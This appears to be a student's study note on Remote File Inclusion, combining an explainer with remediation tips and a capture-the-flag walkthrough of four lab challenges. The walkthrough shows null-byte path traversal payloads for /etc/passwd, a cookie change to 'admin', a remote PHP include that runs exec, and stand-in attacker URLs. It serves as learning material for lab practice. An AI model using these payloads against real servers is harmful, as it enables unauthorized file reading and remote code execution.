---
sticker: emoji//1f629
---
# WHAT IS RFI

Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.  

  

The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

```ad-important
- Sensitive Information Disclosure
- Cross-site Scripting (XSS)
- Denial of Service (DoS)
```
  

An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png)  


The graph below illustrates the typical flow of a RFI attack.

![What is RFI](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/what-is-rfi-attack.png)

## The differences between RFI and LFI

Similar to RFI, local file inclusion (LFI) is a vector that involves uploading [malicious files to servers via web browsers](https://www.imperva.com/learn/application-security/malware-detection-and-removal/). The two vectors are often referenced together in the context of file inclusion attacks.

In both cases, a successful attack results in malware being uploaded to the targeted server. However, unlike RFI, LFI assaults aim to exploit insecure local file upload functions that fail to validate user-supplied/controlled input.

As a result, malicious character uploads and directory/path traversal attacks are allowed for. Perpetrators can then directly upload malware to a compromised system, as opposed to retrieving it using a tempered external referencing function from a remote location.

## Remote file inclusion examples

To illustrate how RFI penetrations work, consider these examples:

```ad-example
- A JSP page contains this line of code: 

`<jsp:include page=”<%=(String)request.getParmeter(“ParamName”)%>”>` 

can be manipulated with the following request: 

`Page1.jsp?ParamName=/WEB-INF/DB/password`


Processing the request reveals the content of the password file to the perpetrator.

- A web application has an import statement that requests content from a URL address, as shown here: 

`<c:import url=”<=request.getParameter(“conf”)%>”>`

If unsanitized, the same statment can be used for malware injection.

For example: 

`Page2.jsp?conf=https://evilsite.com/attack.js`

- RFI attacks are often launched by manipulating the request parameters to refer to a remote malicious file.

For example, consider the following code:

`$incfile = $_REQUEST["file"]; include($incfile.".php");`

Here, the first line extracts the file parameter value from the HTTP request, while the second line uses that value to dynamically set the file name. In the absence of appropriate sanitization of the file parameter value, this code can be exploited for unauthorized file uploads.

For example, this URL string `http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_` contains an external reference to a backdoor file stored in a remote location `(http://www.hacker.com/backdoor_shell.php.)`

Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.

![R57 backdoor shell](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/r57-backdoor-shell.jpg.webp)

The R57 backdoor shell is a popular choice for RFI attacks.
```

# RFI steps

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server `http://attacker.thm/cmd.txt` where `cmd.txt` contains a printing message  Hello THM.

```php
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.


## REMEDIATION

As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

  

1. Keep system and services, including web application frameworks, updated with the latest version.  
    
2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.  
    
5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
6. Never trust user input, and make sure to implement proper input validation against file inclusion.  
    
7. Implement whitelisting for file names and locations as well as blacklisting.



# CHALLENGE


## FIRST

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181015.png)

We need to go into inspector and change the method from `GET` to `POST`

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181107.png)

Once we've changed that, send the request to burp and modify the value to POST:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181139.png)

Once that is done, we will be able to retrieve the flag:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181202.png)

## SECOND


![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181228.png)

Seems like something related to the cookies, let's look at them:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181327.png)

Let's try changing the cookies to `admin`:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181413.png)

Nice, we were able to bypass that, let's get our flag:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181626.png)

If we change our value to an invalid input, we are able to see the directory include is working, so, the correct input would be:

`../../../../etc/passwd%00`

We use that `%00` to reference a null byte, in order to bypass that `.php` read the function performs:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181803.png)

And just like that, challenge 2 is done!

## THIRD


![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105181938.png)

We can read from the file name, let's input something like:

`../../../../etc/flag3%00`

To check if we are able to get the flag:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182048.png)

Hmm, something weird happened let's check at inspector tab to view if the request is actually a post request:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182134.png)

And this is where the issue relies, let's change it to post:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182747.png)




![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182754.png)

Now, let's give the previous payload to the file section:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182811.png)

Let's send the request:


![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182825.png)

Nice, we got the flag!

## FOURTH 

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182924.png)

We need to gain RCE in that section, let's check:

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105182954.png)

First, let's create a file with the following php code saved as a txt file:

`<?php echo exec("hostname");?>`

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105183103.png)

Now, we need to pass the following to the lab:


```ad-note
- Create a python3 server using: `python3 -m http.server`
- Pass in the following input: `http://ip:port/nameoffile.txt`
- Enjoy!

# POC

![](CYBERSECURITY/IMAGES/Pasted%20image%2020241105183251.png)



```


